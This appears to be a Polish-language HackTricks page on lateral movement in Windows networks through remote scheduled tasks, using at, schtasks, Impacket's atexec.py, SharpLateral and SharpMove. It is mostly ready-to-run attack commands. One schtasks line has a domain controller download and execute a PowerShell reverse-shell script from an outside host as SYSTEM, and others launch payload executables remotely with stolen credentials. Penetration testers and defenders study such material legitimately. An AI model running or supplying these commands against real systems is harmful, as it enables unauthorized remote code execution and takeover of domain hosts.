# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

At pozwala planować zadania na hostach, na których znasz nazwę użytkownika/(hasło/Hash). Dzięki temu możesz używać go do wykonywania poleceń na innych hostach i uzyskiwania wyników.
```
At \\victim 11:00:00PM shutdown -r
```
Używając schtasks, należy najpierw utworzyć zadanie, a następnie je wywołać:
```bash
schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
schtasks /run /tn <TASK_NAME> /S <VICTIM>
```

```bash
schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
```
Możesz użyć **`atexec.py` z Impacket**, aby wykonywać polecenia w systemach zdalnych za pomocą polecenia AT. Wymaga to prawidłowych danych uwierzytelniających (nazwy użytkownika i hasła lub hasha) dla systemu docelowego.
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
Możesz również użyć [SharpLateral](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
Możesz użyć [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Więcej informacji o [**użyciu schtasks z silver tickets tutaj**](../active-directory-methodology/silver-ticket.md#host).

{{#include ../../banners/hacktricks-training.md}}
